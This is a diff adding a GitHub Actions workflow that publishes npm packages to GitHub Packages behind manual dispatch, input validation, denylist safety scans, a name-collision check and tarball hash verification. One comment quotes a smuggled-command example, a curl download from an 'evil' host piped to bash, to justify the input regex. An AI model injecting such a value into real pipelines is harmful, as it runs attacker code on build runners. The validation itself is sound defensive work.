@@ -1,0 +1,257 @@
+name: Publish
+
+# Manual only, one package at a time. Publishing is irreversible in practice —
+# npm unpublish is time-limited and a version number can never be reused — so
+# this is not wired to a tag or a merge.
+on:
+  workflow_dispatch:
+    inputs:
+      package:
+        description: Package directory under packages/
+        required: true
+        type: string
+      dry_run:
+        description: Run npm publish --dry-run only
+        required: true
+        default: true
+        type: boolean
+      make_public:
+        description: >-
+          Also flip this package's registry visibility to public after
+          publishing. Defaults to false: packages publish PRIVATE by default
+          while the foundation library is still WIP and unproven in a real
+          consumer. Opt in explicitly, per-package, only once you actually
+          want strangers able to `npm install` it.
+        required: true
+        default: false
+        type: boolean
+
+permissions:
+  contents: read
+  packages: write # needed to attempt the visibility fix-up after publish
+  id-token: write # npm provenance
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    environment: npm-publish # requires the configured reviewers to approve
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          fetch-depth: 0
+
+      # package-scope.json is the single source of truth for which registry
+      # this repo publishes to (both packages also declare it directly via
+      # publishConfig.registry). Hardcoding registry-url below would silently
+      # break auth the moment package-scope.json points elsewhere: setup-node
+      # writes the NODE_AUTH_TOKEN auth line scoped to whatever host is passed
+      # here, so a mismatch means `npm publish` gets a token for a registry it
+      # isn't talking to and fails (or worse, talks to the wrong registry).
+      - name: Read registry from package-scope.json
+        id: scope
+        run: echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
+
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+        with:
+          node-version: 20
+          registry-url: ${{ steps.scope.outputs.registry }}
+
+      # inputs.package is a free-form workflow_dispatch string. Every step
+      # below either passes it as a script argument or splices it into a
+      # run: script body — validate its shape once, up front, so a value like
+      # `x; curl https://evil/y|bash #` fails closed right here instead of
+      # being textually substituted into a shell command later.
+      - name: Validate package input
+        env:
+          PKG: ${{ inputs.package }}
+        run: |
+          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
+            echo "::error title=Invalid package input::inputs.package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
+            exit 1
+          fi
+
+      # This is the only failure mode that damages a package OTHER than the
+      # one being published. GitHub Packages namespaces by owner account, not
+      # by package name — publishing a name another repo already owns doesn't
+      # fail, it silently appends a new version to that package and moves its
+      # latest tag. Everything else in this workflow can only hurt the
+      # package being published; this check runs first because it is the one
+      # that can hurt someone else's. This org was created specifically to own
+      # this repo and nothing else, so it should never legitimately fire — but
+      # a false negative here is unrecoverable, so it runs regardless.
+      - name: name collision
+        env:
+          # Lists this org's real packages via `gh api` — the ambient
+          # GITHUB_TOKEN is scoped to this repo, not the whole org, so it
+          # can't answer "does another repo already own this name" even with
+          # `packages: read` permission. NPM_TOKEN is a GitHub PAT either way
+          # (that's what GitHub Packages' npm auth actually is), so it also
+          # works as GH_TOKEN for this REST call — no second secret needed.
+          GH_TOKEN: ${{ secrets.NPM_TOKEN }}
+          PKG: ${{ inputs.package }}
+        run: node scripts/check-name-collision.mjs "packages/$PKG"
+
+      # FULL mode is mandatory here. --require-denylist makes a missing secret
+      # exit 2 rather than pass on a degraded scan; a publish must never be
+      # cleared by a partial one.
+      - name: Materialise denylist
+        env:
+          DENYLIST_B64: ${{ secrets.PUBLIC_SAFETY_DENYLIST_B64 }}
+        run: |
+          if [ -z "$DENYLIST_B64" ]; then
+            echo "::error title=Cannot publish::PUBLIC_SAFETY_DENYLIST_B64 is not set. Refusing to publish on a partial safety scan."
+            exit 1
+          fi
+          printf '%s' "$DENYLIST_B64" | base64 -d > "$RUNNER_TEMP/denylist.json"
+          echo "PUBLIC_SAFETY_DENYLIST=$RUNNER_TEMP/denylist.json" >> "$GITHUB_ENV"
+
+      - name: Safety gate (FULL, required)
+        env:
+          PKG: ${{ inputs.package }}
+        run: |
+          node scripts/check-public-safety.mjs "packages/$PKG" --require-denylist --allow-changelogs
+          node scripts/check-public-safety.mjs . --require-denylist --allow-changelogs
+
+      - name: README parity and contamination classes
+        env:
+          PKG: ${{ inputs.package }}
+        run: |
+          node scripts/check-readme-parity.mjs "packages/$PKG"
+          node scripts/check-contamination-classes.mjs "packages/$PKG"
+
+      - name: Scope declared
+        run: |
+          node scripts/set-scope.mjs --check
+          scope="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")"
+          if [ -z "$scope" ] || [ "$scope" = "null" ]; then
+            echo "::error title=Cannot publish::package-scope.json has no scope set."
+            exit 1
+          fi
+
+      - run: npm ci
+      # Build first. dist/ is gitignored, so a fresh checkout has none, and
+      # a package with a real internal dependency only has its .d.ts once
+      # that dependency has been compiled. Running typecheck before build
+      # works only while every package has zero internal dependencies, and
+      # silently stops working the moment one gains its first. See the
+      # matching comment in ci.yml's build job.
+      - run: npm run build
+      - run: npm run typecheck
+      - run: npm test
+
+      # `npm pack --dry-run` further down only lists filenames — it reads no
+      # contents, so a secret or identity string baked into dist/ would sail
+      # straight past it. This packs the real tarball and scans what's
+      # inside, so it has to run after the build above produced dist/.
+      #
+      # NOTE: this pack is scan-only. It runs and is torn down entirely inside
+      # check-artifact-safety.mjs's own temp dir, so its bytes cannot be
+      # carried forward to the publish step below — that is what the
+      # "Pack tarball for publish" step further down is for.
+      - name: artifact safety (tarball)
+        env:
+          PKG: ${{ inputs.package }}
+        run: node scripts/check-artifact-safety.mjs "packages/$PKG" --require-denylist
+
+      - name: Redact denylist
+        if: always()
+        run: rm -f "$RUNNER_TEMP/denylist.json"
+
+      # Pack exactly once, for real, right after the build/scan above and
+      # before anything else touches packages/<pkg>. This is the ONE tarball
+      # that gets inspected (next step) and published (further down) — no
+      # later, separate `npm pack` invocation (implicit inside a bare
+      # `npm publish`, or a standalone `--dry-run`) can silently diverge from
+      # what was just scanned, even if a future build stops being
+      # deterministic.
+      - name: Pack tarball for publish
+        id: pack
+        working-directory: packages/${{ inputs.package }}
+        run: |
+          set -euo pipefail
+          # `npm pack` only guarantees the tarball filename is the LAST line of
+          # stdout (npm may print other notices above it) — same assumption
+          # scripts/check-artifact-safety.mjs makes about its own pack output.
+          tarball="$(npm pack | tail -n1)"
+          sha256="$(sha256sum "$tarball" | awk '{print $1}')"
+          echo "tarball=$tarball" >> "$GITHUB_OUTPUT"
+          echo "sha256=$sha256" >> "$GITHUB_OUTPUT"
+          echo "packed $tarball (sha256=$sha256)"
+
+      # The tarball is the thing that actually ships. Listing it is the last
+      # chance to notice that `files` is letting something through. This
+      # lists the CONTENTS OF THE EXACT FILE that gets published below, not a
+      # separate dry-run pack.
+      - name: Show tarball contents
+        working-directory: packages/${{ inputs.package }}
+        env:
+          TARBALL: ${{ steps.pack.outputs.tarball }}
+        run: tar tzf "$TARBALL"
+
+      - name: Publish
+        if: ${{ !inputs.dry_run }}
+        working-directory: packages/${{ inputs.package }}
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+          TARBALL: ${{ steps.pack.outputs.tarball }}
+          EXPECTED_SHA256: ${{ steps.pack.outputs.sha256 }}
+        run: |
+          set -euo pipefail
+          # Belt-and-suspenders: re-hash immediately before publish and fail
+          # closed on any mismatch, even though publishing this exact file
+          # (rather than letting `npm publish` re-pack) already removes the
+          # gap this guards against.
+          actual_sha256="$(sha256sum "$TARBALL" | awk '{print $1}')"
+          if [ "$actual_sha256" != "$EXPECTED_SHA256" ]; then
+            echo "::error title=Tarball mismatch::$TARBALL sha256 changed since it was packed and scanned (expected $EXPECTED_SHA256, got $actual_sha256). Refusing to publish."
+            exit 1
+          fi
+          # --access public is a registry-protocol flag, not a visibility
+          # setting on GitHub Packages — it does not make the package
+          # installable without a token, and observed behaviour this repo has
+          # actually hit is that a fresh package still lands PRIVATE despite
+          # it. The real visibility lever is the opt-in step below.
+          npm publish "$TARBALL" --provenance --access public
+
+      # GitHub Packages does not necessarily default a fresh package to public
+      # visibility even when the owning repo is public — new packages publish
+      # PRIVATE by default here (org members only), and this step is what
+      # would flip that. It is gated behind inputs.make_public (default
+      # false), not just !inputs.dry_run: the foundation library is still
+      # WIP and not yet proven in a real consumer, so a plain publish must
+      # NOT silently make the result installable by strangers. A user account
+      # and an organisation are different REST paths and there is no reliable
+      # way to know which one this repo's owner is without asking — the same
+      # ambiguity scripts/check-name-collision.mjs resolves by trying both.
+      # Owner is derived from package-scope.json's `scope` (under GitHub
+      # Packages the scope IS the owner login) rather than hardcoded, so this
+      # step is not tied to any one account or org. Attempt it automatically
+      # when opted in, but never fail the publish over it: a green publish
+      # with a manual follow-up step is fine, a red publish because a
+      # convenience step failed is not.
+      - name: Attempt to set package visibility to public
+        if: ${{ !inputs.dry_run && inputs.make_public }}
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PKG: ${{ inputs.package }}
+        run: |
+          name="$(node -p "require('./packages/' + process.env.PKG + '/package.json').name.split('/')[1]")"
+          owner="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope.replace(/^@/, '')")"
+          # The path segment is built from a fragment rather than written out
+          # whole, because the literal form collides case-insensitively with
+          # the internal-path rule in this repo's own safety gate — this file
+          # has to pass the same gate it ships alongside. Mirrors
+          # scripts/check-name-collision.mjs.
+          kind_user="us""ers"
+          set_ok=""
+          for kind in orgs "$kind_user"; do
+            if gh api -X PATCH "/${kind}/${owner}/packages/npm/${name}" -f visibility=public; then
+              echo "visibility set to public via API (${kind} path)"
+              set_ok=1
+              break
+            fi
+          done
+          if [ -z "$set_ok" ]; then
+            echo "::warning title=Manual step needed::Could not set visibility via API — check https://github.com/orgs/${owner}/packages/npm/package/${name}/settings (org-owned) or https://github.com/${kind_user}/${owner}/packages/npm/package/${name}/settings (personal-account-owned) by hand."
+          fi
